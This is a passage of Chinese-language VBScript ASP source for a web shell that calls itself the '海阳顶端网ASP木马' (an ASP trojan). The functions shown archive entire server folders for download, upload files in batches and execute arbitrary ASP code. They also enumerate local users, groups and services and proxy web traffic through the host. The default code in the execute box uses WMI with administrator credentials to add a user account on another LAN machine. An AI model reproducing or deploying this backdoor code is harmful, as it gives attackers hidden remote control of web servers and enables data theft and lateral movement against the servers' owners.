			Echo "<textarea style='width:436;' name=""" & x.Name & "_Column""" & IIf(x.Type = 201 Or x.Type = 203, " rows=6", "")
			Echo IIf(x.Properties("ISAUTOINCREMENT").Value, " disabled", "") 
			Echo IIf(x.Name = strPrimaryKey, " title='主键,由于主键约束,将无法被修改,也不能出现相同值.'", "") & ">"
			Echo HtmlEncode(x.value)
			Echo "</textarea></td></tr>"
		Next
		Echo "<tr>"
		Echo "<td colspan=2 class=td align=center>"
		If multiTables = False Then
			If strPrimaryKey = "" Then
				Echo "<input type=button value=修改 onclick=if(confirm('确定要修改这条记录吗?\n此表没有主键,继续操作可能会导致数据库灾难,并且该错误无法被撤消.')){this.form.theAct.value='save';this.form.submit();}>"
			 Else
				Echo "<input type=submit value=修改 onclick=this.form.theAct.value='save';>"
				Echo "<input type=button value=添加 onclick=if(confirm('确实要添加当前为新记录吗?')){this.form.theAct.value='new';this.form.submit();};>"
				Echo "<input type=button value=删除 onclick=if(confirm('确实删除当前记录吗?')){this.form.theAct.value='del';this.form.submit();};>"
			End If
		 Else
			Echo "<input type=button value=暂不支持多表操作 disabled>"
		End If
		Echo "<input type=reset value=重置><input type=button value=关闭 onclick='window.close();'>"
		If IsNumeric(strValue) = True Then
			Echo "<input type=button value=上一条 onclick=""this.form.theAct.value='pre';this.form.submit();"">"
			Echo "<input type=button value=下一条 onclick=""this.form.theAct.value='next';this.form.submit();"">"
		End If
		Echo "</td>"
		Echo "</tr>"
		Echo "</table>"
		
		rs.Close
		Set rs = Nothing
		DestoryConn()
	End Sub

	Sub CreateConn()
		Dim connStr, mdbInfo, userName, passWord, strPath
		If isDebugMode = False Then On Error Resume Next
		Set conn = Server.CreateObject("Adodb.Connection")
		If LCase(Left(thePath, 4)) = "sql:" Then
			connStr = Mid(thePath, 5)
			isSqlServer = True
		 Else
			mdbInfo = Split(thePath, ";")
			strPath = mdbInfo(0)
			strPath = strPath
			ChkErr(Err)
			If UBound(mdbInfo) >= 2 Then
				userName = mdbInfo(1)
				passWord = mdbInfo(2)
			End If
			connStr = Replace(accessStr, "{$dbSource}", strPath)
			connStr = Replace(connStr, "{$userId}", userName)
			connStr = Replace(connStr, "{$passWord}", passWord)
		end if
		conn.Open connStr
		ChkErr(Err)
	End Sub
	
	Sub DestoryConn()
		conn.Close
		Set conn = Nothing
	End Sub
	
	Function GetDataType(flag)
		Dim str
		Select Case flag
			Case 0 : str = "EMPTY"
			Case 2 : str = "SMALLINT"
			Case 3 : str = "INTEGER"
			Case 4 : str = "SINGLE"
			Case 5 : str = "DOUBLE"
			Case 6 : str = "CURRENCY"
			Case 7 : str = "DATE"
			Case 8 : str = "BSTR"
			Case 9 : str = "IDISPATCH"
			Case 10 : str = "ERROR"
			Case 11 : str = "BIT"
			Case 12 : str = "VARIANT"
			Case 13 : str = "IUNKNOWN"
			Case 14 : str = "DECIMAL"
			Case 16 : str = "TINYINT"
			Case 17 : str = "UNSIGNEDTINYINT"
			Case 18 : str = "UNSIGNEDSMALLINT"
			Case 19 : str = "UNSIGNEDINT"
			Case 20 : str = "BIGINT"
			Case 21 : str = "UNSIGNEDBIGINT"
			Case 72 : str = "GUID"
			Case 128 : str = "BINARY"
			Case 129 : str = "CHAR"
			Case 130 : str = "WCHAR"
			Case 131 : str = "NUMERIC"
			Case 132 : str = "USERDEFINED"
			Case 133 : str = "DBDATE"
			Case 134 : str = "DBTIME"
			Case 135 : str = "DBTIMESTAMP"
			Case 136 : str = "CHAPTER"
			Case 200 : str = "VARCHAR"
			Case 201 : str = "LONGVARCHAR"
			Case 202 : str = "VARWCHAR"
			Case 203 : str = "LONGVARWCHAR"
			Case 204 : str = "VARBINARY"
			Case 205 : str = "LONGVARBINARY"
			Case Else : str = flag
		End Select
		GetDataType = str
	End Function
	
	Function GetPrimaryKey(strTable)
		Dim rsPrimary
		If isDebugMode = False Then On Error Resume Next
		Set rsPrimary = conn.OpenSchema(28, Array(Empty, Empty, strTable))
		If Not rsPrimary.Eof Then GetPrimaryKey = rsPrimary("COLUMN_NAME")
		Set rsPrimary = Nothing
	End Function

	Sub PagePack()
		ShowTitle("文件夹打包/解开器")
		Server.ScriptTimeOut = 5000
		
		If theAct = "PackIt" Or theAct = "PackOne" Then
			PackIt()
			AlertThenClose("打包成功!生成为该文件夹目录下的" & sPacketName & "文件.\n下载下来后可以使用unpack.vbs进行解开.")
			Response.End()
		End If
		If theAct = "UnPack" Then
			UnPack()
			AlertThenClose("解开成功!解开目录为" & sPacketName & "所在目录.")
			Response.End()
		End If
		
		PackTable()
	End Sub
	
	Sub PackTable()
		Echo "<base target=_blank>"
		Echo Replace(sHeader, "{$s}", "文件夹打包/解开器(需FSO支持)")
		Echo "<form method=post action='" & url & "'>"
		Echo "<tr>"
		Echo "<td width='20%'>&nbsp;打包</td>"
		Echo "<td>&nbsp;<input name=thePath value='" & HtmlEncode(rootPath) & "' style='width:467px;'> "
		Echo "<input type=hidden value=PagePack name=PageName>"
		Echo "<input type=hidden value=PackIt name=theAct>"
		Echo "<input type=hidden value=FSO name=Param>"
		Echo "<input type=submit value='开始打包'>"
		Echo "</td></tr>"
		Echo "</form>"
		Echo "<form method=post action='" & url & "'>"
		Echo "<tr>"
		Echo "<td>&nbsp;解包</td>"
		Echo "<td>&nbsp;<input name=thePath value=""" & HtmlEncode(rootPath & "\" & sPacketName) & """ style='width:467px;'> "
		Echo "<input type=hidden value=PagePack name=PageName>"
		Echo "<input type=hidden value=UnPack name=theAct>"
		Echo "<input type=submit value='开始解包'>"
		Echo "</td></tr>"
		Echo "</form>"
		Echo sFooter

		Echo "<br />"
		Echo Replace(sHeader, "{$s}", "文件夹打包器(需Shell.Application支持)")
		Echo "<form method=post action='" & url & "'>"
		Echo "<tr>"
		Echo "<td width='20%'>&nbsp;打包</td>"
		Echo "<td>&nbsp;<input name=thePath value='" & HtmlEncode(rootPath) & "' style='width:467px;'> "
		Echo "<input type=hidden value=PagePack name=PageName>"
		Echo "<input type=hidden value=PackIt name=theAct>"
		Echo "<input type=hidden value=APP name=Param>"
		Echo "<input type=submit value='开始打包'>"
		Echo "</td></tr>"
		Echo "</form>"
		Echo sFooter

		Echo "<br />"
		Echo Replace(sHeader, "{$s}", "文件夹打包器(需WScript.Shell支持)")
		Echo "<form method=post action='" & url & "'>"
		Echo "<tr>"
		Echo "<td width='20%'>&nbsp;打包</td>"
		Echo "<td>&nbsp;<input name=cmdStr value='" & HtmlEncode(rootPath) & "' style='width:467px;'> "
		Echo "<input type=hidden name=PageName value='PageWsCmdRun' />"
		Echo "<input type=hidden value=PackIt name=theAct>"
		Echo "<input type=submit value='开始打包'>"
		Echo "</td></tr>"
		Echo "</form>"
		Echo sFooter
	End Sub

	Sub PackIt()
		Dim rs, db, conn, stream, connStr, objX, sParam, strPath, strPathB, isFolder, adoCatalog

		strPath = thePath
		sParam = GetPost("Param")
		db = strPath & "\" & sPacketName
		If sParam = "" Then sParam = "FSO"
		Set rs = Server.CreateObject("ADODB.RecordSet")
		Set stream = Server.CreateObject("ADODB.Stream")
		Set conn = Server.CreateObject("ADODB.Connection")
		Set adoCatalog = Server.CreateObject("ADOX.Catalog")
		connStr = "Provider=Microsoft.Jet.OLEDB.4.0; Data Source=" & db

		If oFso.FolderExists(strPath) = False Then
			ShowErr(thePath & " 目录不存在或者不允许访问!")
		End If
		If oFso.FileExists(db) = False Then
			adoCatalog.Create connStr
			conn.Open connStr
			conn.Execute("Create Table FileData(Id int IDENTITY(0,1) PRIMARY KEY CLUSTERED, P Text, fileContent Image)")
		 Else
			conn.Open connStr
		End If
		
		stream.Open
		stream.Type = 1
		rs.Open "[FileData]", conn, 3, 3

		If theAct = "PackIt" Then
			If sParam = "FSO" Then Call FsoTreeForMdb(strPath, rs, stream)
			If sParam = "APP" Then Call AppTreeForMdb(strPath, rs, stream)
		 Else
		 	strPath = GetPost("truePath") & "\"
			For Each objX In Request.Form("checkBox")
				strPathB = strPath & objX
				isFolder = oFso.FolderExists(strPathB)
				If isFolder = True Then
					Execute("Call " & sParam & "TreeForMdb(strPathB, rs, stream)")
				 Else
			 		If isDebugMode = False Then On Error Resume Next
					If InStr(sysFileList, "$" & objX & "$") <= 0 Then
						rs.AddNew
						rs("P") = Mid(strPathB, 4)
						stream.LoadFromFile(strPathB)
						rs("fileContent") = stream.Read()
						rs.Update
					End If
				End If
			Next
		End If

		rs.Close
		Conn.Close
		stream.Close
		Set rs = Nothing
		Set conn = Nothing
		Set stream = Nothing
		Set adoCatalog = Nothing
	End Sub
	
	Sub UnPack()
		Dim rs, ws, str, conn, stream, connStr, strPath, theFolder
		If isDebugMode = False Then On Error Resume Next

		strPath = thePath
		str = oFso.GetParentFolderName(strPath) & "\"
		Set rs = CreateObject("ADODB.RecordSet")
		Set stream = CreateObject("ADODB.Stream")
		Set conn = CreateObject("ADODB.Connection")
		connStr = "Provider=Microsoft.Jet.OLEDB.4.0;Data Source=" & strPath

		conn.Open connStr
		ChkErr(Err)
		rs.Open "FileData", conn, 1, 1
		stream.Open
		stream.Type = 1

		Do Until rs.Eof
			theFolder = Left(rs("P"), InStrRev(rs("P"), "\"))
			If oFso.FolderExists(str & theFolder) = False Then
				CreateFolder(str & theFolder)
			End If
			stream.SetEOS()
			If IsNull(rs("fileContent")) = False Then stream.Write rs("fileContent")
			stream.SaveToFile str & rs("P"), 2
			rs.MoveNext
		Loop

		rs.Close
		conn.Close
		stream.Close
		Set ws = Nothing
		Set rs = Nothing
		Set stream = Nothing
		Set conn = Nothing
	End Sub
	
	Sub FsoTreeForMdb(strPath, rs, stream)
		If isDebugMode = False Then On Error Resume Next
		Dim item, theFolder, folders, files
		Set theFolder = oFso.GetFolder(strPath)
		Set files = theFolder.Files
		Set folders = theFolder.SubFolders

		For Each item In folders
			Call FsoTreeForMdb(item.Path, rs, stream)
		Next

		For Each item In files
			If InStr(sysFileList, "$" & item.Name & "$") <= 0 Then
				rs.AddNew
				rs("P") = Mid(item.Path, 4)
				stream.LoadFromFile(item.Path)
				rs("fileContent") = stream.Read()
				rs.Update
			End If
		Next

		Set files = Nothing
		Set folders = Nothing
		Set theFolder = Nothing
	End Sub
	
	Sub AppTreeForMdb(sPath, rs, stream)
		If isDebugMode = False Then On Error Resume Next
		Dim oFolder, oMember, sFileName
		If Len(sPath) > 3 And Right(sPath, 1) = "\" Then sPath = Left(sPath, Len(sPath) - 1)
		Set oFolder = oShl.NameSpace(sPath)

		For Each oMember In oFolder.Items
			If oMember.IsFolder = True Then
				Call AppTreeForMdb(oMember.Path, rs, stream)
			Else
				sFileName = Mid(oMember.Path, InStrRev(oMember.Path, "\") + 1)
				If InStr(sysFileList, "$" & sFileName & "$") <= 0 Then
					rs.AddNew
					rs("P") = Mid(oMember.Path, 4)
					stream.LoadFromFile(oMember.Path)
					rs("fileContent") = stream.Read()
					rs.Update
				End If
			End If
		Next

		Set oFolder = Nothing
		Set oMember = Nothing
	End Sub

	Sub PageUpload()
		ShowTitle("批量文件上传")
		theAct = Request.QueryString("theAct")
		If theAct = "upload" Then
			StreamUpload()
			Echo "<script>alert('上传成功!');history.back();</script>"
		End If
		ShowUpload()
	End Sub
	
	Sub ShowUpload()
		If thePath = "" Then thePath = rootPath
		Echo "<form method=post onsubmit=this.Submit.disabled=true; enctype='multipart/form-data' action=?PageName=PageUpload&theAct=upload>"
		Echo Replace(sHeader, "{$s}", "批量文件上传")
		Echo "<tr>"
		Echo "<td width='20%'>"
		Echo "&nbsp;上传到:"
		Echo "</td>"
		Echo "<td>"
		Echo "&nbsp;<input name=thePath type=text id=thePath value=""" & HtmlEncode(thePath) & """ size=48><input type=checkbox name=overWrite>覆盖模式"
		Echo "</td>"
		Echo "</tr>"
		Echo "<tr>"
		Echo "<td valign=top>"
		Echo "&nbsp;文件选择: "
		Echo "</td>"
		Echo "<td>&nbsp;<input id=fileCount size=6 value=1> <input type=button value=设定 onclick=makeFile(fileCount.value)>"
		Echo "<div id=fileUpload>"
		Echo "&nbsp;<input name=file1 type=file size=50>"
		Echo "</div></td>"
		Echo "</tr>"
		Echo "<tr>"
		Echo "<td class=trHead colspan=2>&nbsp;</td>"
		Echo "</tr>"
		Echo "<tr>"
		Echo "<td align=center class=td colspan=2>"
		Echo "<input type=submit name=Submit value=上传 onclick=this.form.action+='&overWrite='+this.form.overWrite.checked;>"
		Echo "<input type=reset value=重置><input type=button value=关闭 onclick=window.close();>"
		Echo "</td>"
		Echo "</tr>"
		Echo "</table>"
		Echo "</form>"
		Echo "<script language=javascript>" & vbNewLine
		Echo "function makeFile(n){" & vbNewLine
		Echo "	fileUpload.innerHTML = '&nbsp;<input name=file1 type=file size=50>'" & vbNewLine
		Echo "	for(var i=2; i<=n; i++)" & vbNewLine
		Echo "		fileUpload.innerHTML += '<br/>&nbsp;<input name=file' + i + ' type=file size=50>';" & vbNewLine
		Echo "}" & vbNewLine
		Echo "</script>"
	End Sub
	
	Sub StreamUpload()
		Dim sA, sB, aryForm, aryFile, theForm, newLine, overWrite
		Dim strInfo, strName, strPath, strFileName, intFindStart, intFindEnd
		Dim itemDiv, itemDivLen, intStart, intDataLen, intInfoEnd, totalLen, intUpLen, intEnd
		If isDebugMode = False Then On Error Resume Next
		Server.ScriptTimeOut = 99999
		newLine = ChrB(13) & ChrB(10)
		overWrite = Request.QueryString("overWrite")
		overWrite = IIf(overWrite = "true", "2", "1")
		Set sA = Server.CreateObject("Adodb.Stream")
		Set sB = Server.CreateObject("Adodb.Stream")
		
		sA.Type = 1
		sA.Mode = 3
		sA.Open
		sA.Write Request.BinaryRead(Request.TotalBytes)
		sA.Position = 0
		theForm = sA.Read()
'		sA.SaveToFile "c:\001.txt", 2 ''保存到临时文件进行查看
		itemDiv = LeftB(theForm, InStrB(theForm, newLine) - 1)
		totalLen = LenB(theForm)
		itemDivLen = LenB(itemDiv)
		intStart = itemDivLen + 2
		intUpLen = 0 '上面数据的长度
		Do
			intDataLen = InStrB(intStart, theForm, itemDiv) - itemDivLen - 5 ''equals - 2(回车) - 1(InStr) - 2(回车)
			intDataLen = intDataLen - intUpLen
			intEnd = intStart + intDataLen
			intInfoEnd = InStrB(intStart, theForm, newLine & newLine) - 1

			sB.Type = 1
			sB.Mode = 3
			sB.Open
			sA.Position = intStart
			sA.CopyTo sB, intInfoEnd - intStart ''保存元素信息部分
			
			sB.Position = 0
			sB.Type = 2
			sB.CharSet = "GB2312"
			strInfo = sB.ReadText()

			strFileName = ""
			intFindStart = InStr(strInfo, "name=""") + 6
			intFindEnd = InStr(intFindStart, strInfo, """", 1)
			strName = Mid(strInfo, intFindStart, intFindEnd - intFindStart)

			If InStr(strInfo, "filename=""") > 0 Then ''>0则为文件,开始接收文件
				intFindStart = InStr(strInfo, "filename=""") + 10
				intFindEnd = InStr(intFindStart, strInfo, """", 1)
				strFileName = Mid(strInfo, intFindStart, intFindEnd - intFindStart)
				strFileName = Mid(strFileName, InStrRev(strFileName, "\") + 1)
			End If

			sB.Close
			sB.Type = 1
			sB.Mode = 3
			sB.Open
			sA.Position = intInfoEnd + 4
			sA.CopyTo sB, intEnd - intInfoEnd - 4

			If strFileName <> "" Then
				sB.SaveToFile strPath & strFileName, overWrite
				ChkErr(Err)
			 Else
				If strName = "thePath" Then
					sB.Position = 0
					sB.Type = 2
					sB.CharSet = "GB2312"
					strInfo = sB.ReadText()
					thePath = strInfo
					strPath = strInfo & "\"
				End If
			End If
			
			sB.Close

			intUpLen = intStart + intDataLen + 2
			intStart = intUpLen + itemDivLen + 2
		Loop Until (intStart + 2) = totalLen

		sA.Close
		Set sA = Nothing
		Set sB = Nothing
	End Sub

	Sub PageLogin()
		Dim passWord
		passWord = Encode(GetPost("password"))

		If theAct = "Login" Then
			If userPassword = passWord Then
				Session(m & "userPassword") = userPassword
				TopMenu()
				Exit Sub
			Else
				JavaScript("alert('登录失败!');history.back();")
				Echo userPassword & " = " & passWord
				Response.End()
			End If
		End If
		
		If PageName = "PageOut" Then
			Session.Contents.Remove(m & "userPassword")
			Response.Redirect(url)
		End If
		
		If Session(m & "userPassword") = userPassword Then
			TopMenu()
			Exit Sub
		End If
		
		ShowTitle("管理登录")
		Echo "<body onload=document.formx.password.focus();>"
		Echo "<table width=416 align=center>"
		Echo "<form method=post name=formx action=""" & url & """>"
		Echo "<input type=hidden name=theAct value=Login>"
		Echo "<input type=hidden name=PageName value='" & s & "'>"
		Echo "<tr>"
		Echo "<td align=center class=td>管 理 登 录</td>"
		Echo "</tr>"
		Echo "<tr>"
		Echo "<td class=trHead>&nbsp;</td>"
		Echo "</tr>"
		Echo "<tr>"
		Echo "<td height=75 align=center>"
		Echo "<input name=password type=password style='border:1px solid #d8d8f0;background-color:#ffffff;'> "
		Echo "<input type=submit value=LOGIN style='border:1px solid #d8d8f0;background-color:#f9f9fd;'>"
		Echo "</td>"
		Echo "</tr>"
		Echo "<tr>"
		Echo "<td align=center class=td>2006PLUS @ 海阳顶端网ASP木马</td>"
		Echo "</tr>"
		Echo "</form>"
		Echo sClientTracer
		Echo "</table>"
		Echo "</body>"
	End Sub
	
	Function Encode(sPass)
		Dim i, sStr, sTmp

		For i = 1 To Len(sPass)
			sTmp = Asc(Mid(sPass, i, 1))
			sStr = sStr & Abs(sTmp)
		Next

		sPass = sStr
		sStr = ""

		Do While Len(sPass) > 16
			sPass = JoinCutStr(sPass)
		Loop

		For i = 1 To Len(sPass)
			sTmp = CInt(Mid(sPass, i, 1))
			sTmp = IIf(sTmp > 6, Chr(sTmp + 60), sTmp)
			sStr = sStr & sTmp
		Next

		Encode = sStr
	End Function
	
	Function JoinCutStr(str)
		Dim i, sStr
		For i = 1 To Len(str)
			If Len(str) - i = 0 Then Exit For
			sStr = sStr & Chr(CInt((Asc(Mid(str, i, 1)) + Asc(Mid(str, i + 1, 1))) / 2))
			i = i + 1
		Next
		JoinCutStr = sStr
	End Function

	Sub PageExecute()
		Dim strAspCode
		strAspCode = GetPost("AspCode")
		ShowTitle("自定义ASP语句执行")
		
		If strAspCode = "" Then
			strAspCode = "REM 以下为ASP语句执行示例, 其功能是在局域网中的其它有权限的机器上运行相应命令" & vbNewLine & vbNewLine & "set ww=server.createobject(""wbemscripting.swbemlocator"")" & vbNewLine & "set cc=ww.connectserver(""192.168.2.1"",""root/cimv2"",""administrator"",""xiaolu"")" & vbNewLine & "set ss=cc.get(""Win32_ProcessStartup"")" & vbNewLine & "Set pp=cc.get(""Win32_Process"")" & vbNewLine & "Response.Write pp.create(""net user xiaolu xiaolu /add"",null,oC,iProcessID)" & vbNewLine & "Echo ""<br>"" & iProcessID"
		End If

		If theAct = "Exe" Then
			Echo "<table width=750 class=fixTable>"
			Echo "<tr>"
			Echo "<td class=trHead>&nbsp;</td>"
			Echo "</tr>"
			Echo "<tr>"
			Echo "<td class=td><font face=webdings>8</font> 执行结果</td>"
			Echo "</tr>"
			Echo "<tr><td style='padding-left:6px;padding-right:5px;'>"
			Execute(strAspCode)
			Echo "</td></tr></table>"
		End If
		ShowExeTable(strAspCode)
	End Sub
	
	Sub ShowExeTable(strAspCode)
		Echo "<form method=post onsubmit=this.Submit.disabled=true; action=""" & url & """>"
		Echo Replace(sHeader, "{$s}", "自定义ASP语句执行")
		Echo "<tr>"
		Echo "<td valign=top width='10%'>"
		Echo "&nbsp;ASP语句: "
		Echo "</td>"
		Echo "<td>&nbsp;"
		Echo "<textarea name=AspCode cols=91 rows=23 title='By Marcos 2006.02'>" & HtmlEncode(strAspCode) & "</textarea>"
		Echo "</td>"
		Echo "</tr>"
		Echo "<tr>"
		Echo "<td class=trHead colspan=2>&nbsp;</td>"
		Echo "</tr>"
		Echo "<tr>"
		Echo "<td align=center class=td colspan=2>"
		Echo "<input type=hidden name=PageName value=PageExecute>"
		Echo "<input type=hidden name=theAct value=Exe>"
		Echo "<input type=submit name=Submit value=提交>"
		Echo "<input type=reset value=重置>"
		Echo "</td>"
		Echo "</tr>"
		Echo "</table>"
		Echo "</form>"
	End Sub

	Sub PageUserList()
		Dim oUser, oGroup, oComputer
		
		ShowTitle("系统用户及用户组信息查看")
		Set oComputer = GetObject("WinNT://.")
		oComputer.Filter = Array("User")

		Echo Replace(sHeader, "{$s}", "系统用户信息查看")

		For Each oUser in oComputer
			Echo "<tr class=td><td>&nbsp;用户名:</td><td>&nbsp;" & oUser.Name & "</td></tr>"
			GetUserInfo(oUser.Name)
			Echo "<tr><td class=trHead colspan=2>&nbsp;</td></tr>"
		Next
		Echo "<tr><td align=right class=td colspan=2>Powered By Marcos 2006.02&nbsp;</td></tr></table>"
		
		Echo "<br />"
		Echo Replace(sHeader, "{$s}", "系统用户组查看")
		Echo "<tr><td class=td>&nbsp;组名</td><td>&nbsp;组描述</td></tr>"

		oComputer.Filter = Array("Group")
		For Each oGroup in oComputer
			Echo "<tr><td style='padding-left:7px;'>" & oGroup.Name & "</td>"
			Echo "<td style='padding-left:7px;'>" & oGroup.Description & "</td></tr>"
		Next

		Echo sFooter
	End Sub
	
	Sub GetUserInfo(strUser)
		Dim User, Flags
		If isDebugMode = False Then
			On Error Resume Next
		End If
		Set User = GetObject("WinNT://./" & strUser & ",user")
		Echo "<tr><td>&nbsp;描述:</td><td>&nbsp;" & User.Description & "</td></tr>"
		Echo "<tr><td>&nbsp;所属用户组:</td><td>&nbsp;" & GetItsGroup(strUser) & "</td></tr>"
		Echo "<tr><td>&nbsp;密码已过期:</td><td>&nbsp;" & cbool(User.Get("PasswordExpired")) & "</td></tr>"
		Flags = User.Get("UserFlags")
		Echo "<tr><td>&nbsp;密码永不过期:</td><td>&nbsp;" & cbool(Flags And &H10000) & "</td></tr>"
		Echo "<tr><td>&nbsp;用户不能更改密码:</td><td>&nbsp;" & cbool(Flags And &H00040) & "</td></tr>"
		Echo "<tr><td>&nbsp;非全局帐号:</td><td>&nbsp;" & cbool(Flags And &H100) & "</td></tr>"
		Echo "<tr><td>&nbsp;密码的最小长度:</td><td>&nbsp;" & User.PasswordMinimumLength & "</td></tr>"
		Echo "<tr><td>&nbsp;是否要求有密码:</td><td>&nbsp;" & User.PasswordRequired & "</td></tr>"
		Echo "<tr><td>&nbsp;帐号停用中:</td><td>&nbsp;" & User.AccountDisabled & "</td></tr>"
		Echo "<tr><td>&nbsp;帐号锁定中:</td><td>&nbsp;" & User.IsAccountLocked & "</td></tr>"
		Echo "<tr><td>&nbsp;用户信息文件:</td><td>&nbsp;" & User.Profile & "</td></tr>"
		Echo "<tr><td>&nbsp;用户登录脚本:</td><td>&nbsp;" & User.LoginScript & "</td></tr>"
		Echo "<tr><td>&nbsp;用户Home目录:</td><td>&nbsp;" & User.HomeDirectory & "</td></tr>"
		Echo "<tr><td>&nbsp;用户Home目录根:</td><td>&nbsp;" & User.Get("HomeDirDrive") & "</td></tr>"
		Echo "<tr><td>&nbsp;帐号过期时间:</td><td>&nbsp;" & User.AccountExpirationDate & "</td></tr>"
		Echo "<tr><td>&nbsp;帐号失败登录次数:</td><td>&nbsp;" & User.BadLoginCount & "</td></tr>"
		Echo "<tr><td>&nbsp;帐号最后登录时间:</td><td>&nbsp;" & User.LastLogin & "</td></tr>"
		Echo "<tr><td>&nbsp;帐号最后注销时间:</td><td>&nbsp;" & User.LastLogoff & "</td></tr>"
		For Each RegTime In User.LoginHours
			If RegTime < 255 Then Restrict = True
		Next
		Echo "<tr><td>&nbsp;帐号已用时间:</td><td>&nbsp;" & Restrict & "</td></tr>"
		Err.Clear
	End Sub
	
	Function GetItsGroup(sUser)
		Dim oUser, oGroup
		Set oUser = GetObject("WinNT://./" & sUser & ",user")
		For Each oGroup In oUser.Groups
			GetItsGroup = GetItsGroup & oGroup.Name & " "
		Next
	End Function

	Sub PageServiceList()
		Dim oService, oComputer
		If isDebugMode = False Then On Error Resume Next
				
		ShowTitle("系统服务信息查看")
		Set oComputer = GetObject("WinNT://.")
		oComputer.Filter = Array("Service")

		Echo Replace(sHeader, "{$s}", "系统服务信息查看")

		For Each oService In oComputer
			Echo "<tr class=td><td width=105>&nbsp;服务名称: </td><td style='padding-left:7px;'>" & oService.Name & "</td></tr>"
			Echo "<tr><td>&nbsp;显示名称: </td><td style='padding-left:7px;'>" & oService.DisplayName & "</td></tr>"
			Echo "<tr><td>&nbsp;启动类型: </td><td style='padding-left:7px;'>" & oGetStartType(oService.StartType) & "</td></tr>"
			Echo "<tr><td>&nbsp;运行状态: </td><td style='padding-left:7px;'>" & oShl.IsServiceRunning(oService.Name) & "</td></tr>"
			Echo "<tr><td>&nbsp;登录身份: </td><td style='padding-left:7px;'>" & oService.ServiceAccountName & "</td></tr>"
'			Echo "当前状态: " & oService.Status & "<br/>"
'			Echo "服务类型: " & oService.ServiceType & "<br/>"
			Echo "<tr><td>&nbsp;服务描述: </td><td class=fixTable style='padding-left:7px;'>" & GetServiceDsc(oService.Name) & "</td></tr>"
			Echo "<tr><td>&nbsp;文件路径及参数: </td><td style='padding-left:7px;'>" & oService.Path & "</td></tr>"
			Echo "<tr><td class=trHead colspan=2>&nbsp;</td></tr>"
		Next
		
		Echo "<tr><td align=right class=td colspan=2>Powered By Marcos 2006.02&nbsp;</td></tr></table>"
	End Sub
	
	Function GetServiceDsc(sService)
		GetServiceDsc = oWshl.RegRead("HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\" & sService & "\Description")
	End Function
	
	Function GetStartType(n)
		Select Case n
			Case 2
				GetStartType = "自动"
			Case 3
				GetStartType = "手动"
			Case 4
				GetStartType = "已禁用"
		End Select
	End Function

	Sub PageWebProxy()
		Dim i, re, Html
		Response.Clear()
		If sUrl <> "" Then Url = sUrl Else Url = Request.QueryString("url")
		If Url = "" Then Response.Redirect("?PageName=PageWebProxy&url=http://hididi.net/")

		Set re = New RegExp
		re.IgnoreCase = True
		re.Global = True

		sUrlB = Url
		Html = getHTTPPage(Url)
		If sUrl <> "" Then Echo Html:Response.End()
		Url = Left(Url, InStrRev(Url, "/"))

		i = InStr(sUrlB, "?")
		If i > 0 Then
			sUrlB = Left(sUrlB, i - 1)
		End If

		re.Pattern = "(href|action)=(\'|"")?(\?)"
		Html = re.Replace(Html,"$1=$2" & sUrlB & "?")

		re.Pattern = "(src|action|href)=(\'|"")?((http|https|javascript):[A-Za-z0-9\./=\?%\-&_~`@[\]\':+!]+([^<>""])+)(\'|"")?"
		Html = re.Replace(Html,"$1x=$2$3$2")

		re.Pattern = "(window\.open|url)\((\'|"")?((http|https):(\/\/|\\\\)[A-Za-z0-9\./=\?%\-&_~`@[\]:+!]+([^\'<>""])+)(\'|"")?\)"
		Html = re.Replace(Html,"$1x($2$3$2)")

		re.Pattern = "(src|action|href|background)=(\'|"")?([^\/""\'][A-Za-z0-9\./=\?%\-&_~`@[\]:+!]+([^\'<>""])+)(\'|"")?"
		Html = re.Replace(Html,"$1=$2" & Url & "$3$2")
		re.Pattern = "(src|action|href|background)=(\'|"")?\/([^""\'][A-Za-z0-9\./=\?%\-&_~`@[\]:+!]+([^\'<>""])+)(\'|"")?"
		Html = re.Replace(Html,"$1=$2http://" & Split(Url, "/")(2) & "/$3$2")
		re.Pattern = "(src|action|href)=(\'|"")?\/(\'|"")?"
		Html = re.Replace(Html,"$1=$2http://" & Split(Url, "/")(2) & "/$2")

		re.Pattern = "(window\.open|url)\((\'|"")?([^\/""\'http:][A-Za-z0-9\./=\?%\-&_~`@[\]+!]+([^\'<>""])+)(\'|"")?\)"
		Html = re.Replace(Html,"$1($2" & Url & "$3$2)")
		re.Pattern = "(window\.open|url)\((\'|"")?\/([^""\'http:][A-Za-z0-9\./=\?%\-&_~`@[\]+!]+([^\'<>""])+)(\'|"")?\)"
		Html = re.Replace(Html,"$1($2http://" & Split(Url, "/")(2) & "/$3$2)")

		Html = Replace(Html, "&", "%26")
		Html = Replace(Html, "%26nbsp;", "&nbsp;")
		Html = Replace(Html, "%26lt;", "&lt;")
		Html = Replace(Html, "%26gt;", "&gt;")
		Html = Replace(Html, "%26quot;", "&quot;")
		Html = Replace(Html, "%26copy;", "&copy;")
		Html = Replace(Html, "%26reg;", "&reg;")
		Html = Replace(Html, "%26raquo;", "&raquo;")
		Html = Replace(Html, "%26%26", "&&")
		Html = Replace(Html, "%26#", "&#")

		re.Pattern = "(src|action|href)x=(\'|"")?((http|https|javascript):[A-Za-z0-9\./=\?%\-&_~`@[\]\':+!]+([^<>""])+)(\'|"")?"
		Html = re.Replace(Html, "$1=$2$3$2")

		re.Pattern = "((http|https):(\/\/|\\\\)[A-Za-z0-9\./=\?%\-&_~`@[\]\':+!]+([^<>""])+)"
		Html = re.Replace(Html, "?PageName=PageWebProxy&url=$1")

		re.Pattern = "\?PageName=PageWebProxy&url=" & Url & "(#|javascript:)"
		Html = re.Replace(Html, "$1")

		re.Pattern = "multipart\/form-data"
		Html = re.Replace(Html, "")

		re.Pattern = ">\?PageName=PageWebProxy&url=((http|https|javascript):[A-Za-z0-9\./=\?%\-&_~`@[\]\':+!]+([^<>""])+)<"
		Html = re.Replace(Html, ">$1<")

		Echo Html
	End Sub

	Function GetHTTPPage(url)
		Dim Http, x, theStr, fileExt
		Set Http = Server.CreateObject("MSXML2.XMLHTTP")

		If Request.Form.Count > 0 Then
			For Each x In Request.Form
				theStr = theStr & UrlEncode(x) & "=" & UrlEncode(Request.Form(x)) & "&"
			Next
			Http.Open "POST", url, False
			Http.SetRequestHeader "CONTENT-TYPE", "application/x-www-form-urlencoded"
			Http.Send(theStr)
		 Else
			On Error Resume Next
			Http.Open "GET", url, False
			Http.Send()
		End If

		If Http.ReadyState <> 4 Then Exit Function

		fileExt = LCase(Mid(url, InStrRev(url, ".") + 1))
		If InStr("$jpg$gif$bmp$png$js$", "$" & fileExt & "$") > 0 Then
			Response.Clear
			Response.BinaryWrite Http.ResponseBody
			Response.End()
